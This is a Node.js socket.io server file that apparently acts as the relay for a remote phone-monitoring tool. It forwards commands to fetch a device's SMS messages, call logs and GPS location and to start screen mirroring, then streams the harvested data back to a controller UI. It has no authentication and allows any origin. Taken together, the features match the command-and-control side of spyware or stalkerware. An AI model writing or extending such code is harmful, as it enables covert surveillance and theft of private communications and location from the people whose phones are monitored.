const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);
    
    // Data request relays - ADD THESE
    socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
    socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
    socket.on('get-gps-request', () => socket.broadcast.emit('get-gps-request'));
    
    // Mirroring relays
    socket.on('request-screen-view', () => {
        console.log('Screen view requested');
        socket.broadcast.emit('request-screen-view');
    });
    
    socket.on('stop-mirroring', () => {
        console.log('Stop mirroring requested');
        socket.broadcast.emit('stop-mirroring');
    });
    
    socket.on('screen-status', (status) => {
        console.log('Screen status:', status);
        socket.broadcast.emit('screen-status', status);
    });
    
    // Data relays
    socket.on('screen-data', (data) => {
        // console.log('Screen data received:', data.length, 'bytes');
        socket.broadcast.emit('ui-screen-stream', data);
    });
    
    socket.on('battery-status', (data) => {
        console.log('Battery update:', data);
        socket.broadcast.emit('ui-battery', data);
    });
    
    socket.on('sms-data-log', (data) => {
        console.log('SMS data received:', data.length, 'items');
        socket.broadcast.emit('ui-sms-display', data);
    });
    
    socket.on('call-log-data', (data) => {
        console.log('Call log data received:', data.length, 'items');
        socket.broadcast.emit('ui-calls-display', data);
    });
    
    socket.on('gps-update', (data) => {
        console.log('GPS update:', data);
        socket.broadcast.emit('ui-gps', data);
    });
    
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
    });
});

server.listen(process.env.PORT || 3000, () => {
    console.log(`Server running on port ${process.env.PORT || 3000}`);
});
